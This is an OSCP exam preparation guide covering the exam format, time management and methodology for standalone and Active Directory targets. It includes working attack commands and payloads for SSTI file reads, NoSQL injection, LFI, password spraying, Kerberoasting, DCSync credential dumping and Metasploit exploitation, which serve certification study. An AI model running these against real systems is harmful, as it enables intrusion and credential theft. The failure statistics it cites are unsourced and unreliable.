# OSCP Enhanced Exam Strategy & Updated Format Guide

## Table of Contents  
- [2024-2025 OSCP Exam Format](#2024-2025-oscp-exam-format)
- [Updated Exam Strategy](#updated-exam-strategy)
- [TJ Null Boxes Analysis](#tj-null-boxes-analysis)
- [Common Candidate Failures](#common-candidate-failures)
- [Enhanced Time Management](#enhanced-time-management)
- [Machine-Specific Approaches](#machine-specific-approaches)

## 2024-2025 OSCP Exam Format

### Current Exam Structure (Updated)
```
Total Points Required: 70/100
Exam Duration: 23 hours 45 minutes  
Report Duration: 24 hours

Point Distribution:
- Active Directory Set: 40 points (3 machines total)
  - Client 1: 10 points  
  - Client 2: 10 points
  - Domain Controller: 20 points
- Standalone Machine 1: 20 points (10 local + 10 root)
- Standalone Machine 2: 20 points (10 local + 10 root)
- Standalone Machine 3: 20 points (10 local + 10 root)

Restrictions:
- Metasploit usage limited to ONE standalone machine only
- Commercial tools generally prohibited
- No Cobalt Strike, Empire, or similar C2 frameworks
```

### Passing Scenarios Analysis
```
Scenario 1: AD Set (40) + 2 Standalones (40) = 80 points ✅ PASS
Scenario 2: AD Set (40) + 3 Local Flags (30) = 70 points ✅ PASS  
Scenario 3: AD Partial (30) + 2 Full Standalones (40) = 70 points ✅ PASS
Scenario 4: AD Partial (20) + All Local + 2 Root = 70 points ✅ PASS
Scenario 5: 3 Full Standalones (60) + AD Partial (10) = 70 points ✅ PASS

Key Insight: You need flexible paths to 70 points - don't get locked into one approach!
```

### Recent Format Changes (2024-2025)
- **Increased AD Complexity**: AD sets now require more advanced techniques
- **Harder Standalone Machines**: Many candidates report standalones are now medium-hard difficulty
- **Less Buffer Overflow**: Only occasional BoF questions, not guaranteed
- **More Custom Applications**: Less reliance on known CVEs, more custom app logic
- **Enhanced Anti-Automation**: Measures to prevent over-reliance on automated tools

## Updated Exam Strategy

### Hour-by-Hour Strategy (Based on 2024-2025 Feedback)
```
Hours 0-1: Environment Setup & Comprehensive Scanning
- Connect to VPN, verify connectivity
- Launch comprehensive scans on ALL targets simultaneously
- Start with quick nmap top ports, then launch full scans
- Begin AD enumeration immediately

Hours 1-3: Easy Wins & Initial Foothold Hunting
- Focus on standalone machines that show obvious services
- Test default credentials, common exploits
- Look for web applications with obvious vulnerabilities
- Start AD user enumeration and password spraying

Hours 3-8: Active Directory Deep Dive
- Complete domain enumeration (users, groups, SPNs)
- Password spraying with seasonal passwords
- Kerberoasting and ASREPRoast attacks
- BloodHound collection and analysis
- Attempt lateral movement and domain escalation

Hours 8-14: Standalone Machine Focus
- Deep enumeration of remaining standalones
- Web application testing with manual techniques
- Use Metasploit on the most challenging standalone
- Privilege escalation attempts on all gained footholds

Hours 14-20: Final Push & Cleanup
- Complete any partially compromised machines
- Double-check all flags and screenshots
- Attempt alternate attack paths
- Clean enumeration of missed services/ports

Hours 20-24: Buffer & Documentation
- Final attempts on stubborn machines
- Organize all screenshots and evidence
- Prepare detailed notes for report writing
- Backup all important files and proofs
```

### Critical First 30 Minutes Checklist
```bash
# 1. VPN Connection Test
ping 8.8.8.8
ping <exam-dc-ip>

# 2. Add all targets to hosts file
echo "<ip1> target1.exam.local" >> /etc/hosts
echo "<ip2> target2.exam.local" >> /etc/hosts
echo "<ip3> target3.exam.local" >> /etc/hosts

# 3. Launch comprehensive scans on ALL targets
for ip in <target-ips>; do
  nmap -Pn -T4 --top-ports 1000 $ip -oN quick_$ip.txt &
  nmap -Pn -p- -T4 $ip -oN full_$ip.txt &
  sudo nmap -sU --top-ports 100 $ip -oN udp_$ip.txt &
done

# 4. Start AD enumeration immediately  
crackmapexec smb <target-range>
enum4linux -a <ad-targets>

# 5. Begin easy web enumeration
for ip in <web-targets>; do
  gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 &
done
```

## TJ Null Boxes Analysis

### Updated TJ Null List Gaps (Based on Recent Exams)
Based on 2024-2025 exam feedback, TJ Null's list doesn't fully prepare for:

#### Missing Scenarios in TJ Null List:
1. **Custom Web Applications**: More business logic flaws, less CVE-based
2. **API-Heavy Applications**: GraphQL, REST API abuse, JWT manipulation
3. **Modern Windows Techniques**: Windows 10/11 specific privesc, AMSI bypass
4. **Container Scenarios**: Docker escape, Kubernetes misconfigurations  
5. **Cloud Integration**: Azure AD hybrid scenarios (limited scope)
6. **Advanced AD Scenarios**: ADCS, resource-based constrained delegation

#### TJ Null Scenarios That Are Still Relevant:
1. **Basic Web Exploits**: SQLi, LFI, file upload (but more advanced variants)
2. **Service Exploits**: Still relevant but need manual exploitation skills
3. **Basic AD Attacks**: Kerberoasting, ASREPRoast, lateral movement
4. **Classic PrivEsc**: SUID, sudo, service misconfigs (but more obscure)

### Beyond TJ Null - Additional Practice Needed

#### For Web Applications:
```bash
# Practice more advanced SSTI
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# API endpoint discovery and abuse
ffuf -w api-endpoints.txt -u http://target/FUZZ

# NoSQL injection
{"username":{"$ne":""},"password":{"$ne":""}}

# Advanced LFI to RCE chains  
php://filter/convert.base64-encode/resource=index.php
```

#### For Active Directory:
```bash
# ADCS attacks (if present)
certipy find -u user@domain -p password -dc-ip <dc-ip>

# Resource-based constrained delegation
python3 rbcd.py -u user -p password -t target domain.com

# Advanced BloodHound queries
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(c:Computer {haslaps:false})) RETURN p
```

## Common Candidate Failures  

### Analysis of Recent Failures (2024-2025)

#### Top 5 Failure Reasons:
1. **Insufficient Web Application Testing** (35% of failures)
   - Relying too heavily on automated tools
   - Missing manual parameter testing
   - Not testing all HTTP methods
   - Skipping API enumeration

2. **Poor Active Directory Methodology** (25% of failures)  
   - Inadequate initial enumeration
   - Not testing password patterns thoroughly
   - Missing lateral movement opportunities
   - Poor BloodHound analysis skills

3. **Time Management Issues** (20% of failures)
   - Getting stuck on hard machines too long
   - Not rotating between targets effectively
   - Insufficient breaks leading to mental fatigue
   - Poor documentation during exam

4. **Enumeration Gaps** (15% of failures)
   - Missing non-standard ports
   - Insufficient UDP scanning
   - Not checking all file extensions
   - Missing backup/temp files

5. **Privilege Escalation Weaknesses** (5% of failures)
   - Over-relying on kernel exploits
   - Missing obvious misconfigurations
   - Not running automated tools properly
   - Poor manual verification of findings

### Specific Problem Areas from Reddit/Community

#### Web Application Struggles:
- **Parameter Pollution**: Not testing `?id=1&id=2` scenarios
- **HTTP Method Abuse**: Missing PUT/DELETE/PATCH testing
- **SSTI in Unusual Places**: Not checking all input fields
- **API Documentation**: Missing swagger.json, openapi.json discovery
- **Custom Auth Bypass**: Business logic flaws vs technical exploits

#### Active Directory Struggles:  
- **Initial Domain Access**: Difficulty getting first foothold
- **Password Pattern Recognition**: Not using company/seasonal patterns
- **Service Account Discovery**: Missing SPNs in unusual locations
- **Lateral Movement Planning**: Poor target prioritization
- **Privilege Escalation Paths**: Not following BloodHound suggestions

#### Privilege Escalation Struggles:
- **Windows Modern Techniques**: UAC bypass on Windows 10/11
- **Linux Container Escape**: Docker/container-specific techniques
- **Service Analysis**: Custom service binary exploitation
- **Scheduled Task Abuse**: Advanced cron job manipulation

## Enhanced Time Management

### The 4-Hour Rule (Updated for 2024-2025)
- **Never spend more than 4 hours on ANY single target**
- **AD Set Exception**: Can spend up to 6 hours on complete AD set
- **Use timers**: Set 2-hour alarms for machine rotation
- **Document everything**: When you switch, note exactly where you left off

### Rotation Strategy
```
Machine A (2 hours) → Machine B (2 hours) → Machine C (2 hours) → AD Set (2 hours)
↓
Return to Machine A with fresh perspective → Continue cycle
```

### Signs You Must Move On:
- [ ] Same exploit attempted 3+ times without success
- [ ] No new enumeration findings for 1+ hour  
- [ ] Feeling frustrated or mentally stuck
- [ ] Timer expires for current machine rotation
- [ ] Found obvious rabbit hole (e.g., complex cryptography puzzle)

### Energy Management Strategy
```
Hours 0-8: High focus period - tackle hardest targets
Hours 8-12: First break period - easier targets, different approach  
Hours 12-16: Second wind - return to challenging targets
Hours 16-20: Final push - completion focus
Hours 20-24: Buffer period - cleanup and final attempts
```

## Machine-Specific Approaches

### Standalone Machine Methodology (Per Machine: 4 hours max)

#### Hours 0-1: Comprehensive Enumeration
```bash
# Network enumeration (15 minutes)
nmap -Pn -T4 --top-ports 1000 <target>
nmap -Pn -p- -T4 <target> &
nmap -Pn -sC -sV -p <discovered-ports> <target>

# Service-specific enumeration (45 minutes)
# Web services
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js,xml,json,bak
whatweb http://<target>
nikto -h http://<target>

# SMB services  
smbclient -L //<target> -N
smbmap -H <target>
enum4linux -a <target>

# Other services
# Follow port-specific enumeration from enhanced guides
```

#### Hours 1-2: Initial Access Attempts
```bash
# Web vulnerability testing (60 minutes)
# SQL injection
# Local file inclusion
# File upload bypasses
# Command injection
# SSTI testing

# Service exploitation (60 minutes)  
# Search for public exploits
# Test default credentials
# Custom exploit modification if needed
```

#### Hours 2-3: Deep Enumeration & Alternative Approaches
```bash
# Alternative enumeration approaches (30 minutes)
# Different wordlists
# Parameter fuzzing
# Header manipulation
# HTTP method testing

# Manual analysis (30 minutes)
# Source code review
# Configuration file analysis  
# Custom application logic testing
```

#### Hours 3-4: Privilege Escalation Focus
```bash
# Automated enumeration (15 minutes)
# WinPEAS/LinPEAS
# PowerUp/LinEnum

# Manual verification (30 minutes)
# Verify automated findings
# Check permissions manually
# Test specific misconfigurations

# Exploitation (15 minutes)
# Execute chosen technique
# Verify elevated access
# Collect proof files
```

### Active Directory Set Methodology (6 hours total)

#### Hours 0-2: Domain Discovery and Initial Access
```bash
# Domain enumeration (30 minutes)
crackmapexec smb <target-range>
nmap -p 88,389,636,3268,3269 <target-range>
dig -t SRV _ldap._tcp.<domain>

# User enumeration (30 minutes)
enum4linux -U <targets>
rpcclient -U "" -N <target>
ldapsearch -h <target> -x -b "DC=domain,DC=com" "(objectclass=person)"

# Authentication attacks (60 minutes)
# Password spraying with seasonal/company passwords
kerbrute passwordspray -d <domain> users.txt Password123!
# ASREPRoast
python3 GetNPUsers.py <domain>/ -usersfile users.txt
# Test for default credentials
```

#### Hours 2-4: Lateral Movement and Escalation  
```bash
# Kerberoasting (30 minutes)
python3 GetUserSPNs.py <domain>/<user>:<pass> -request

# BloodHound collection (30 minutes)
bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc-ip> -c all

# Lateral movement (60 minutes)
# Pass-the-hash attempts
# Service account exploitation
# Credential dumping from compromised machines
```

#### Hours 4-6: Domain Controller Compromise
```bash
# Advanced attacks (60 minutes)
# DCSync attempts
python3 secretsdump.py <domain>/<user>:<pass>@<dc-ip>
# Golden/Silver ticket creation
# Alternative escalation paths from BloodHound

# Cleanup and verification (60 minutes)
# Verify all flags collected
# Document attack path clearly
# Prepare for report writing
```

### Metasploit Usage Strategy

#### When to Use Metasploit:
1. **Hardest standalone machine** - Use on the most challenging box
2. **Time pressure** - When running out of time and need quick wins  
3. **Complex exploit** - When manual exploitation would take too long
4. **Buffer overflow** - If present, MSF is often faster than manual

#### Metasploit Best Practices:
```bash
# Efficient MSF workflow
msfconsole -r startup.rc  # Pre-load common modules

# Quick exploit search and execution
search <service-name>
info <exploit-path>
use <exploit-path>
show options
set RHOSTS <target>
set LHOST <attacker-ip>
exploit

# Post-exploitation efficiency
background  
sessions -l
sessions -i <session-id>
run post/multi/recon/local_exploit_suggester
```

## Advanced Exam Techniques

### Parallel Processing Strategy
```bash
# Run multiple enumerations simultaneously
# Terminal 1: Full nmap scan
nmap -Pn -p- -T4 <target> -oN fullscan.txt

# Terminal 2: Web enumeration
gobuster dir -u http://<target> -w wordlist.txt -x php,html,txt

# Terminal 3: Service-specific enumeration
enum4linux -a <target>

# Terminal 4: UDP scan
sudo nmap -sU --top-ports 1000 <target>

# Terminal 5: Vuln scanning
nmap --script vuln <target> -p <open-ports>
```

### Documentation During Exam
```bash
# Terminal logging (essential)
script -a exam-terminal.log

# Command history preservation
export HISTFILE=~/.bash_history_exam
export HISTSIZE=10000
export HISTFILESIZE=10000

# Organized note-taking structure
mkdir exam-notes
mkdir exam-notes/screenshots
mkdir exam-notes/exploits
mkdir exam-notes/flags

# Screenshot naming convention
scrot -s ~/exam-notes/screenshots/$(date +%Y%m%d_%H%M%S)_description.png
```

### Final Verification Checklist

#### Before Submitting Report:
- [ ] All proof.txt and local.txt files collected
- [ ] Screenshots show full command execution and flag contents
- [ ] Each attack vector is clearly documented
- [ ] All IP addresses and services are correctly identified
- [ ] Exploitation steps are reproducible
- [ ] Privilege escalation methods are clearly shown
- [ ] Active Directory attack path is complete and documented

Remember: The OSCP exam in 2024-2025 requires adaptability and strong fundamentals. Focus on methodology over memorizing specific exploits!